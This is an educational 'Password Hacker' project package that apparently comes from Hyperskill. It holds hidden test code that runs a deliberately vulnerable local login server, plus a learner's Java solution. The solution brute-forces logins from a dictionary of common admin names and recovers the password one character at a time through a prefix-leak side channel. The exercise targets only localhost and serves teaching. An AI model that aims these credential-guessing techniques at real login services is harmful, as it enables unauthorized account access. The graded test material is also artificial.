type: edu
files:
  - name: test/HackingTests.java
    visible: false
    text: |-
      import com.google.gson.Gson;
      import com.google.gson.JsonElement;
      import com.google.gson.JsonObject;
      import org.hyperskill.hstest.stage.StageTest;
      import org.hyperskill.hstest.testcase.CheckResult;
      import org.hyperskill.hstest.testcase.TestCase;
      
      import java.io.IOException;
      import java.util.List;
      import java.util.Random;
      
      
      public class HackingTests extends StageTest {
        String abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        boolean ready = false;
        ServerHack serverHack = null;
        Thread serverThread = null;
        String password = null;
        String login = null;
      
        String randomLogin() {
          String[] logins = new String[]{
                  "admin", "Admin", "admin1", "admin2", "admin3",
                  "user1", "user2", "root", "default", "new_user",
                  "some_user", "new_admin", "administrator",
                  "Administrator", "superuser", "super", "su", "alex",
                  "suser", "rootuser", "adminadmin", "useruser",
                  "superadmin", "username", "username1"
          };
          Random ran = new Random();
          return logins[ran.nextInt(logins.length)];
        }
      
        String randomPassword() {
          Random ran = new Random();
          int length = ran.nextInt(5) + 6;
          String ret = "";
          for (int i = 0; i < length; i++) {
            ret = ret.concat(String.valueOf(abc.charAt(ran.nextInt(abc.length()))));
          }
          return ret;
        }
      
        void startServer() throws IOException {
          serverHack = new ServerHack(this);
          serverThread = new Thread(serverHack);
          serverThread.start();
      
          while (!ready) {
            try {
              Thread.sleep(100);
            } catch (InterruptedException ignored) {
            }
          }
        }
      
        void stopServer() throws InterruptedException {
          serverHack.disconnect();
          serverThread.join();
        }
      
        @Override
        public List<TestCase<String[]>> generate() {
          try {
            startServer();
          } catch (IOException ignored) {
          }
          password = randomPassword();
          login = randomLogin();
          return List.of(new TestCase<String[]>()
                  .addArguments("localhost", "9090")
                  .setAttach(new String[]{password, login})
                  .setTimeLimit(25000)
          );
        }
      
        public CheckResult check(String reply, Object attach) {
          try {
            stopServer();
          } catch (Exception ignored) {
          }
          if (serverHack == null || !serverHack.connected) {
            return CheckResult.wrong("You didn't connect to the server");
          }
          if (serverHack.message.size() == 0) {
            return CheckResult.wrong("You sent nothing to the server");
          }
          if (reply.length() == 0 || reply.split("\n").length == 0) {
            return CheckResult.wrong("You did not print anything");
          }
      
          String[] attachStr = (String[]) attach;
      
          String realPassword = attachStr[0];
          String realLogin = attachStr[1];
      
          JsonObject jsonReply;
      
          try {
            jsonReply = new Gson().fromJson(reply, JsonObject.class);
          } catch (Exception e) {
            return CheckResult.wrong("The output of your program is not a valid JSON:\n" + reply);
          }
      
          JsonElement passwordElement = jsonReply.get("password");
          if (passwordElement == null) {
            return CheckResult.wrong("The output of your program did not contain the field \"password\":\n" + reply);
          }
          JsonElement loginElement = jsonReply.get("login");
          if (loginElement == null) {
            return CheckResult.wrong("The output of your program did not contain the field \"login\":\n" + reply);
          }
      
          String password_ = passwordElement.getAsString();
          String login_ = loginElement.getAsString();
      
          if (!login_.equals(realLogin)) {
            return CheckResult.wrong("The login you printed is not correct");
          }
          if (!password_.equals(realPassword)) {
            return CheckResult.wrong("The password you printed is not correct");
          }
      
          boolean findFirstLetter = false;
      
          for (String i : serverHack.message) {
            jsonReply = new Gson().fromJson(i, JsonObject.class);
            String pas = jsonReply.get("password").getAsString();
            String log = jsonReply.get("login").getAsString();
            if (!findFirstLetter && pas.length() == 1 && log == realLogin && realPassword.startsWith(pas)) {
              findFirstLetter = true;
            }
            if (findFirstLetter) {
              if (!log.equals(realLogin)) {
                return CheckResult.wrong("You should find a correct login and then use only it");
              }
              if (pas.charAt(0) != realPassword.charAt(0)) {
                return CheckResult.wrong("When you find a first letter you should then start your passwords with it");
              }
              if (pas.length() > 1) {
                if (!pas.substring(0, pas.length() - 1).equals(realPassword.substring(0, pas.length() - 1))) {
                  return CheckResult.wrong(
                          "You have already found the first " + (pas.length() - 1) + " letters of the password. Use them as a" +
                                  " beginning"
                  );
                }
              }
            }
          }
          return CheckResult.correct();
        }
      }
    learner_created: false
  - name: test/ServerHack.java
    visible: false
    text: |
      import com.google.gson.Gson;
      import com.google.gson.JsonObject;
      
      import java.io.DataInputStream;
      import java.io.DataOutputStream;
      import java.io.IOException;
      import java.net.InetAddress;
      import java.net.ServerSocket;
      import java.net.Socket;
      import java.util.ArrayList;
      import java.util.List;
      
      public class ServerHack implements Runnable {
        HackingTests hacking;
      
        boolean stopThread = true;
        boolean connected;
      
        ServerSocket server;
        Socket socket;
        List<String> message = new ArrayList<>();
      
        DataInputStream inputStream;
        DataOutputStream outputStream;
      
        Gson gson;
        JsonObject jsonObject;
      
        public ServerHack(HackingTests hacking) {
          this.hacking = hacking;
          gson = new Gson();
          jsonObject = new JsonObject();
        }
      
        @Override
        public void run() {
          String address = "localhost";
          int port = 9090;
          try {
            server = new ServerSocket(port, 50, InetAddress.getByName(address));
          } catch (IOException ignored) {
          }
          hacking.ready = true;
          try {
            socket = server.accept();
            socket.setSoTimeout(16000);
            connected = true;
      
            inputStream = new DataInputStream(socket.getInputStream());
            outputStream = new DataOutputStream(socket.getOutputStream());
            while (stopThread) {
              String msg = inputStream.readUTF();
              message.add(msg);
              if (message.size() > 100_000_000) {
                jsonObject.addProperty("result", "Too many attempts");
                outputStream.writeUTF(gson.toJson(jsonObject));
                break;
              }
              String login_, password_;
      
              try {
                JsonObject json = new Gson().fromJson(msg, JsonObject.class);
                login_ = json.get("login").getAsString();
                password_ = json.get("password").getAsString();
              } catch (Exception e) {
                jsonObject.addProperty("result", "Bad request!");
                outputStream.writeUTF(gson.toJson(jsonObject));
                continue;
              }
      
              boolean success = false;
              if (login_.equals(hacking.login)) {
                if (password_.equals(hacking.password)) {
                  jsonObject.addProperty("result", "Connection success!");
                  success = true;
                }else{
                  if (hacking.password.startsWith(password_)) {
                    try {
                      Thread.sleep(100);
                    } catch (InterruptedException ignored) {
                    }
                  }
                  jsonObject.addProperty("result", "Wrong password!");
                }
              } else {
                jsonObject.addProperty("result", "Wrong login!");
              }
              outputStream.writeUTF(gson.toJson(jsonObject));
              if (success) {
                break;
              }
            }
            disconnect();
          } catch (IOException ignored) {
          }
        }
      
        public void disconnect() {
          stopThread = false;
          try {
            inputStream.close();
            socket.close();
            server.close();
          } catch (IOException ignored) {
          }
        }
      }
    learner_created: false
  - name: src/hacker/json/ServerResponse.java
    visible: true
    text: |
      package hacker.json;
      
      /**
       * An object which holds a server response and can be converted from json.
       */
      public class ServerResponse {
          private final String result;
      
          public ServerResponse(String result) {
              this.result = result;
          }
      
          public String getResult() {
              return result;
          }
      }
    learner_created: true
  - name: src/hacker/main/BinaryFilter.java
    visible: true
    text: |
      package hacker.main;
      
      import java.util.ArrayList;
      import java.util.List;
      import java.util.function.UnaryOperator;
      
      /**
       * This object holds a binary number which can be used to control algorithms, depending on the number. If the filter is 010, then the
       * algorithm will do the false case the first and third times, but will do the true case the second time. The filter can also modify strings
       * based on the state of the filter.
       */
      public class BinaryFilter {
          // The actual binary filter
          private int filter;
          // The length of the filter. Should not go above this length when incrementing
          private final int length;
      
          public BinaryFilter(int length) {
              int temp = 0b1;
              for (int i = 0; i < length; i++) {
                  // The equivalent of multiplying a decimal number by 10, but in binary
                  temp *= 2;
              }
              this.filter = temp;
              this.length = length;
          }
      
          /**
           * Increments the filter by 1. If the filter has reached its limit (if it is equal to one less than 2 ^ the length minus one), then it
           * will not increment.
           * @return whether or not the filter successfully incremented
           */
          public boolean increment() {
              /*
                  Equation explanation:
                  You need to check if the number is equal to one less than the smallest binary number with one more places than the length field
                  in order to verify if you can increment the number. If it is, don't increment.
                  The expression for finding the smallest binary number of a certain amount of places is 2 ^ (# of places - 1). Smallest binary number
                  of 2 places would be 2 ^ 1 = 2, which is 10 in binary. 4 places would be 2 ^ 3 = 8, which is 1000 in binary.
                  Because of this, the expression you should use is 2 ^ (# of places - 1 + 1) = 2 ^ # places.
                  However, you also need to add one to the length to account for the 1 at the beginning of the binary number. So it would be
                  2 ^ (# of places + 1).
                  Then just subtract that by one, and that's it.
               */
              if (this.filter == Math.pow(2, this.length + 1) - 1) {
                  return false;
              } else {
                  this.filter += 1;
                  return true;
              }
          }
      
          /**
           * Takes a string input and returns a modification of the string using the passed function for each character of the string which
           * corresponds with a "1" bit in the filter. For example, if you pass the string "cat" and a function which capitalizes the character,
           * and the filter is 010, then the function will only be applied to the second character, and the returned string will be cAt.
           * @param string the string to modify
           * @param function the function to apply to the corresponding characters
           * @return the modified string
           * @throws IllegalArgumentException if the length of the passed string is not equal to the length of the filter
           */
          public String modifyString(String string, UnaryOperator<Character> function) throws IllegalArgumentException {
              if (string.length() != this.length) {
                  throw new IllegalArgumentException(String.format("The length of the passed string did not equal the length of the filter. Length of the string = %d, length of the filter = %d", string.length(), this.length));
              } else {
                  StringBuilder modifiedString = new StringBuilder();
                  for (int i = 0; i < string.length(); i++) {
                      if (this.getFilter().charAt(i) == '1') {
                          modifiedString.append(function.apply(string.charAt(i)));
                      } else {
                          modifiedString.append(string.charAt(i));
                      }
                  }
                  return modifiedString.toString();
              }
          }
      
          /**
           * Does the same thing as the modifyString method, but applies the function to the string for every combination of bits of the filter
           * and returns an array containing all the modifications. The filter cycles from all 0's to all 1's and applies the function at each iteration.
           * This method always starts at all 0's, and the initial state of the filter is saved at the beginning and reverted to at the end.
           * @param string the string to modify
           * @param function the function to apply to the corresponding characters
           * @return the array of modified string
           */
          public String[] modifyStringAllCombinations(String string, UnaryOperator<Character> function) {
              // The state of the filter before it is changed in the method so it can be reverted to at the end
              int initialFilter = this.filter;
              // Starts at all 0's
              this.filter = generateEmptyFilter();
              List<String> allModifications = new ArrayList<>();
              // Modifies the string when the filter has all 0's, will jump right to ...001 in the loop
              allModifications.add(modifyString(string, function));
              while (increment()) {
                  allModifications.add(modifyString(string, function));
              }
              this.filter = initialFilter;
              return allModifications.toArray(new String[0]);
      
          }
      
          /**
           * Returns a filter of the specified length consisting of all 0's. Same algorithm when instantiating a new filter object.
           * @return the empty filter
           */
          private int generateEmptyFilter() {
              int emptyFilter = 0b1;
              for (int i = 0; i < this.length; i++) {
                  // The equivalent of multiplying a decimal number by 10, but in binary
                  emptyFilter *= 2;
              }
              return emptyFilter;
          }
      
          /**
           * Prints the filter. Does not include the first 1.
           */
          @Deprecated
          public void printFilter() {
              System.out.println(this.getFilter());
          }
      
          public String getFilter() {
              return Integer.toBinaryString(this.filter).substring(1);
          }
      }
    learner_created: true
  - name: src/hacker/data/logins.txt
    visible: true
    text: |-
      admin
      Admin
      admin1
      admin2
      admin3
      user1
      user2
      root
      default
      new_user
      some_user
      new_admin
      administrator
      Administrator
      superuser
      super
      su
      alex
      suser
      rootuser
      adminadmin
      useruser
      superadmin
      username
      username1
    learner_created: true
  - name: src/hacker/json/LoginPasswordPair.java
    visible: true
    text: |
      package hacker.json;
      
      /**
       * An object which stores a login-password pair and can be converted to or from json.
       */
      public class LoginPasswordPair {
          private final String login;
          private final String password;
      
          public LoginPasswordPair(String login, String password) {
              this.login = login;
              this.password = password;
          }
      
      
          public String getLogin() {
              return login;
          }
      
          public String getPassword() {
              return password;
          }
      }
    learner_created: true
  - name: src/hacker/main/Main.java
    visible: true
    text: "package hacker.main;\n\nimport com.google.gson.Gson;\nimport hacker.json.LoginPasswordPair;\n\
    import hacker.json.ServerResponse;\n\nimport java.io.*;\nimport java.net.Socket;\n\
    import java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\
    import java.util.Optional;\nimport java.util.stream.Collectors;\n\nimport static\
    \ hacker.data.Config.LOGINS_DIRECTORY;\nimport static hacker.data.Config.PASSWORDS_DIRECTORY;\n\
    import static hacker.main.Main.Responses.*;\n\npublic class Main {\n     enum\
    \ Responses {\n        WRONG_LOGIN(\"Wrong login!\"), WRONG_PASSWORD(\"Wrong password!\"\
    ), BAD(\"Bad request!\"), EXCEPTION(\"Exception happened during login\"), SUCCESS(\"\
    Connection success!\");\n\n        private final String message;\n           \
    \ \n        Responses(String message) {\n            this.message = message;\n\
    \        }\n\n        private String getMessage() {\n            return message;\n\
    \        }\n    }\n\n    public static void main(String[] args) throws IOException\
    \ {\n         /*\n\n\n\n\n\n         IMPORTANT!!!\n         Make sure to add Gson\
    \ as a dependency each time you load IntelliJ. build.gradle is at C:\\Users\\\
    andre\\IdeaProjects\\Password Hacker (Java)\\build.gradle\n\n\n\n\n\n        \
    \  */\n        String ipAddress = args[0]; int port = Integer.parseInt(args[1]);\n\
    \        try (Socket socket = new Socket(ipAddress, port);\n             DataInputStream\
    \ input = new DataInputStream(socket.getInputStream());\n             DataOutputStream\
    \ output = new DataOutputStream(socket.getOutputStream())) {\n            Gson\
    \ gson = new Gson();\n            String login = bruteForceLoginUsingDictionary(input,\
    \ output).orElse(\"Login not found\");\n            String password = findPasswordUsingVulnerability(login,\
    \ input, output).orElse(\"Password not found.\");\n            System.out.println(gson.toJson(new\
    \ LoginPasswordPair(login, password)));\n        }\n    }\n\n    /**\n     * Brute\
    \ force the login using the dictionary of logins.\n     * @param input the input\
    \ stream to which to respond if the password was correct or not\n     * @param\
    \ output the output stream to which to send the attempted password\n     * @return\
    \ an Optional containing either the correct login or nothing\n     * @throws IOException\
    \ if something goes wrong with the input/output of data\n     */\n    private\
    \ static Optional<String> bruteForceLoginUsingDictionary(DataInputStream input,\
    \ DataOutputStream output) throws IOException {\n        try (Reader reader =\
    \ new FileReader(LOGINS_DIRECTORY)) {\n            // Holds the current login\
    \ being checked from passwords.txt\n            StringBuilder commonLoginBuilder\
    \ = new StringBuilder();\n            // Holds each char that is read, used in\
    \ the while loop\n            int i;\n            while ((i = reader.read()) !=\
    \ -1) {\n                // Current character being read\n                char\
    \ currentCharacter = (char) i;\n                // Checking for whitespace/linebreak\n\
    \                if (Character.toString(currentCharacter).matches(\"\\\\s\"))\
    \ {\n                    String commonLogin = commonLoginBuilder.toString();\n\
    \                    // Doesn't need to try case combinations if the password\
    \ is a number\n                    if (commonLogin.matches(\"[0-9]+\")) {\n  \
    \                      output.writeUTF(commonLogin);\n                       \
    \ // When it says wrong password, that means the login is correct\n          \
    \              if (WRONG_PASSWORD.getMessage().equals(input.readUTF())) {\n  \
    \                          return Optional.of(commonLogin);\n                \
    \        }\n                    } else {\n                        List<LoginPasswordPair>\
    \ allCaseCombinations = generateCaseList(commonLogin, 1);\n                  \
    \      Optional<String> possibleCorrectLogin = tryListOfLoginPasswordPairs(allCaseCombinations,\
    \ 1, input, output);\n                        if (possibleCorrectLogin.isPresent())\
    \ {\n                            return possibleCorrectLogin;\n              \
    \          }\n                    }\n                    commonLoginBuilder =\
    \ new StringBuilder();\n                } else {\n                    commonLoginBuilder.append(currentCharacter);\n\
    \                }\n            }\n        }\n        return Optional.empty();\n\
    \    }\n\n    /**\n     * Finds the password using the vulnerability in stage\
    \ 4 where an inputted password that matches the beginning of the correct password\
    \ will return an exception\n     * message.\n     * @param login the correct login\
    \ to use when finding the password\n     * @param input the input stream to which\
    \ to respond if the password was correct or not\n     * @param output the output\
    \ stream to which to send the attempted password\n     * @return an Optional containing\
    \ either the correct password or nothing\n     * @throws IOException if something\
    \ goes wrong with the input/output of data\n     */\n    private static Optional<String>\
    \ findPasswordUsingVulnerability(String login, DataInputStream input, DataOutputStream\
    \ output) throws IOException {\n         StringBuilder attemptedPasswordBuilder\
    \ = new StringBuilder(\"a\");\n         int currentLength = 1;\n         // The\
    \ character which is being changed to try to find the password\n         char\
    \ volatileChar = 'a';\n        while (true) {\n            // 0 without apostrophes\
    \ is null\n            if (volatileChar == 0) {\n                return Optional.empty();\n\
    \            } else {\n                attemptedPasswordBuilder.replace(currentLength\
    \ - 1, currentLength, String.valueOf(volatileChar));\n                ServerResponse\
    \ response = tryLoginPasswordPair(new LoginPasswordPair(login, attemptedPasswordBuilder.toString()),\
    \ input, output);\n                if (response.getResult().equals(SUCCESS.getMessage()))\
    \ {\n                    return Optional.of(attemptedPasswordBuilder.toString());\n\
    \                } else if (response.getResult().equals(EXCEPTION.getMessage()))\
    \ {\n                    ++currentLength;\n                    attemptedPasswordBuilder.append(\"\
    a\");\n                    volatileChar = 'a';\n                } else {\n   \
    \                 volatileChar = vulnerabilityNextCharacter(volatileChar);\n \
    \               }\n            }\n        }\n    }\n\n    /**\n     * Get the\
    \ next character for use with the stage 4 vulnerability\n     * @param character\
    \ the character from which to get the next character\n     * @return the next\
    \ character\n     */\n    private static char vulnerabilityNextCharacter(char\
    \ character) {\n        // When going to the next character, it goes from a-z\
    \ to A-Z to 0-9 and lastly to ascii code of 0, which is null\n         if (character\
    \ == 'z') {\n             return 'A';\n         } else if (character == 'Z') {\n\
    \             return '0';\n         } else if (character == '9' || character ==\
    \ 0) {\n             return 0;\n         }\n         return (char) (character\
    \ + 1);\n    }\n\n    /**\n     * Brute forces the password using the provided\
    \ dictionary of passwords in passwords.txt. Also tries all possible combinations\
    \ of cases of each password.\n     * @param input the input stream to which to\
    \ respond if the password was correct or not\n     * @param output the output\
    \ stream to which to send the attempted password\n     * @return either an empty\
    \ Optional or an Optional containing the correct password\n     * @throws IOException\
    \ if something goes wrong with the input/output of data\n     */\n    @Deprecated\n\
    \    private static Optional<String> bruteForcePasswordUsingDictionary(String\
    \ login, DataInputStream input, DataOutputStream output) throws IOException {\n\
    \        try (Reader reader = new FileReader(PASSWORDS_DIRECTORY)) {\n       \
    \     // Holds the current password being checked from passwords.txt\n       \
    \     StringBuilder commonPasswordBuilder = new StringBuilder();\n           \
    \ // Holds each char that is read, used in the while loop\n            int i;\n\
    \            while ((i = reader.read()) != -1) {\n                // Current character\
    \ being read\n                char currentCharacter = (char) i;\n            \
    \    // Checking for whitespace/linebreak\n                if (Character.toString(currentCharacter).matches(\"\
    \\\\s\")) {\n                    String commonPassword = commonPasswordBuilder.toString();\n\
    \                    // Doesn't need to try case combinations if the password\
    \ is a number\n                    if (commonPassword.matches(\"[0-9]+\")) {\n\
    \                        output.writeUTF(commonPassword);\n                  \
    \      if (SUCCESS.getMessage().equals(input.readUTF())) {\n                 \
    \           return Optional.of(commonPassword);\n                        }\n \
    \                   } else {\n                        BinaryFilter filter = new\
    \ BinaryFilter(commonPassword.length());\n                        String[] allCaseCombinations\
    \ = filter.modifyStringAllCombinations(commonPassword, Character::toUpperCase);\n\
    \                        Optional<String> possibleCorrectPassword = tryArrayOfPasswords(login,\
    \ allCaseCombinations, input, output);\n                        if (possibleCorrectPassword.isPresent())\
    \ {\n                            return possibleCorrectPassword;\n           \
    \             }\n                    }\n                    commonPasswordBuilder\
    \ = new StringBuilder();\n                    // REMOVE THIS LATER\n         \
    \       } else {\n                    commonPasswordBuilder.append(currentCharacter);\n\
    \                }\n            }\n        }\n        return Optional.empty();\n\
    \    }\n\n    /**\n     * Takes a login password pair object and sends it to the\
    \ sever, then returns the server response for that pair.\n     * @param pair the\
    \ pair object to be sent\n     * @param input the input stream to which to respond\
    \ if the pair was correct or not\n     * @param output the output stream to which\
    \ to send the attempted pair\n     * @return the response from the server\n  \
    \   * @throws IOException if something goes wrong with the input/output of data\n\
    \     */\n    private static ServerResponse tryLoginPasswordPair(LoginPasswordPair\
    \ pair, DataInputStream input, DataOutputStream output) throws IOException {\n\
    \        Gson gson = new Gson();\n        String json = gson.toJson(pair, LoginPasswordPair.class);\n\
    \        output.writeUTF(json);\n        return gson.fromJson(input.readUTF(),\
    \ ServerResponse.class);\n    }\n\n    /**\n     * Takes a list of login password\
    \ pairs and, if the mode is 1, returns the correct login or an empty Optional,\
    \ or if the mode is 2, returns the correct password/beginning\n     * of the correct\
    \ password or an empty Optional.\n     * @param pairs the list of pairs to try\n\
    \     * @param mode the mode of the method. 1 looks for the correct login, 2 looks\
    \ for the correct password/beginning of the correct password\n     * @param input\
    \ the input stream to which to respond if the pair was correct or not\n     *\
    \ @param output the output stream to which to send the attempted pair\n     *\
    \ @return an Optional corresponding with the mode\n     * @throws IOException\
    \ if something goes wrong with the input/output of data\n     */\n    private\
    \ static Optional<String> tryListOfLoginPasswordPairs(List<LoginPasswordPair>\
    \ pairs, int mode, DataInputStream input, DataOutputStream output) throws IOException\
    \ {\n        Gson gson = new Gson();\n        for (LoginPasswordPair pair : pairs)\
    \ {\n            String json = gson.toJson(pair, LoginPasswordPair.class);\n \
    \           output.writeUTF(json);\n            String response = gson.fromJson(input.readUTF(),\
    \ ServerResponse.class).getResult();\n            switch (mode) {\n          \
    \      // Finding login\n                case 1:\n                    if (response.equals(WRONG_PASSWORD.getMessage()))\
    \ {\n                        return Optional.of(pair.getLogin());\n          \
    \          }\n                // Finding password\n                case 2:\n \
    \                   if (response.equals(EXCEPTION.getMessage()) || response.equals(SUCCESS.getMessage()))\
    \ {\n                        return Optional.of(pair.getPassword());\n       \
    \             }\n            }\n        }\n        return Optional.empty();\n\
    \    }\n\n    /**\n     * Takes a string array of passwords and sends each password\
    \ to the provided output stream, testing if it is correct.\n     * @param passwords\
    \ the string array of passwords to be tested\n     * @param input the input stream\
    \ to which to respond if the password was correct or not\n     * @param output\
    \ the output stream to which to send the attempted password\n     * @return either\
    \ an empty Optional or an Optional containing the correct password\n     * @throws\
    \ IOException if something goes wrong with the input/output of data\n     */\n\
    \    private static Optional<String> tryArrayOfPasswords(String login, String[]\
    \ passwords, DataInputStream input, DataOutputStream output) throws IOException\
    \ {\n        for (String password : passwords) {\n            Gson gson = new\
    \ Gson();\n            String json = gson.toJson(new LoginPasswordPair(login,\
    \ password), LoginPasswordPair.class);\n            output.writeUTF(json);\n \
    \           if (SUCCESS.getMessage().equals(input.readUTF())) {\n            \
    \    return Optional.of(password);\n            }\n        }\n        return Optional.empty();\n\
    \    }\n\n    /**\n     * Takes a String value as input,\n     * can be either\
    \ a login or a password, and 1 or 2 as a mode, 1 being for login and 2 being for\
    \ password,\n     * and returns a list of login pairs\n     * containing all case\
    \ variations of the passed value in the corresponding spot.\n     * @param value\
    \ the value, either login or password, to get case variations of\n     * @param\
    \ mode generates variants of either the login or the password, 1 generates login\
    \ variants, 2 generates password variants\n     * @return the list of login pairs\
    \ containing all case variations of the value\n     */\n    private static List<LoginPasswordPair>\
    \ generateCaseList(String value, int mode) {\n        BinaryFilter filter = new\
    \ BinaryFilter(value.length());\n        return switch (mode) {\n            //\
    \ Login\n            case 1 ->\n                    Arrays.stream(filter.modifyStringAllCombinations(value,\
    \ Character::toUpperCase)).map(x -> new LoginPasswordPair(x, \"a\")).toList();\n\
    \            // Password\n            case 2 ->\n                    Arrays.stream(filter.modifyStringAllCombinations(value,\
    \ Character::toUpperCase)).map(x -> new LoginPasswordPair(\"a\", x)).toList();\n\
    \            default -> generateCaseList(value, 1);\n        };\n    }\n\n   \
    \ /**\n     * Tries to brute force all possible passwords.\n     * @param input\
    \ the input stream to which to respond if the password was correct or not\n  \
    \   * @param output the output stream to which to send the attempted password\n\
    \     * @return the correct password once it is found\n     * @throws IOException\
    \ if something goes wrong with the input/output of data\n     */\n    @Deprecated\n\
    \    private static String bruteForce(DataInputStream input, DataOutputStream\
    \ output) throws IOException {\n        List<Character> passwordAttempt = new\
    \ ArrayList<>();\n        passwordAttempt.add('`');\n        infiniteloop:\n \
    \       while (true) {\n            // Check if any part of the password needs\
    \ to cycle back to \"a\"\n            if (passwordAttempt.get(passwordAttempt.size()\
    \ - 1) == '9') {\n                // Iterating backwards until it finds the character\
    \ which is not equal to 9 and sets it to the next character\n                for\
    \ (int i = passwordAttempt.size() - 1; i >= 0; i--) {\n                    if\
    \ (passwordAttempt.get(i) != '9') {\n                        passwordAttempt.set(i,\
    \ nextCharacter(passwordAttempt.get(i)));\n                        // Sets all\
    \ the characters after the found one to \"a\"\n                        for (int\
    \ j = passwordAttempt.size() - 1; j > i; j--) {\n                            passwordAttempt.set(j,\
    \ 'a');\n                        }\n                        continue infiniteloop;\n\
    \                    }\n                }\n                // If the loop finds\
    \ none of them to be not equal to 9, then the password attempt needs to be extended\n\
    \                passwordAttempt.add('a');\n                passwordAttempt =\
    \ passwordAttempt.stream().map(x -> 'a').collect(Collectors.toList());\n     \
    \       } else {\n                passwordAttempt.set(passwordAttempt.size() -\
    \ 1, nextCharacter(passwordAttempt.get(passwordAttempt.size() - 1)));\n      \
    \      }\n            String sentPassword = joinList(passwordAttempt);\n     \
    \       output.writeUTF(sentPassword);\n            if (SUCCESS.getMessage().equals(input.readUTF()))\
    \ {\n                return sentPassword;\n            }\n        }\n    }\n\n\
    \    /**\n     * Returns the next character to be checked in the next iteration\
    \ of the cycle when brute forcing all combinations.\n     * @param previousCharacter\
    \ the previous character which is being changed\n     * @return the next character\
    \ to be checked\n     */\n    @Deprecated\n    private static char nextCharacter(char\
    \ previousCharacter) {\n        if (previousCharacter == 'z') {\n            return\
    \ '0';\n        }\n        return (char) (previousCharacter + 1);\n    }\n\n \
    \   /**\n     * Takes a char list and returns a string containing the contents\
    \ of the list in the same order.\n     * @param array the char list to be joined\n\
    \     * @return the joined list\n     */\n    @Deprecated\n    private static\
    \ <T> String joinList(List<T> array) {\n        StringBuilder sentPassword = new\
    \ StringBuilder();\n        array.forEach(x -> sentPassword.append(x.toString()));\n\
    \        return sentPassword.toString();\n    }\n}\n"
    learner_created: true
  - name: src/hacker/data/Config.java
    visible: true
    text: |
      package hacker.data;
      
      /**
       * Just a config class.
       */
      public class Config {
          // Normal directory: Password Hacker (Java)\task\src\hacker\data\logins.txt
          // When testing: src\hacker\data\logins.txt
          public static final String LOGINS_DIRECTORY = "src\\hacker\\data\\logins.txt";
          // Normal directory: Password Hacker (Java)\task\src\hacker\data\passwords.txt
          // When testing: src\hacker\data\passwords.txt
          public static final String PASSWORDS_DIRECTORY = "src\\hacker\\data\\passwords.txt";
      }
    learner_created: true
feedback_link: https://hyperskill.org/learn/step/26983#comment
status: Solved
feedback:
  message: Well done! You've finished the project. Select a new project on <a href="https://hyperskill.org/projects">Hyperskill</a>
    to continue learning.
  time: "Sat, 01 Jun 2024 17:20:13 UTC"
record: -1
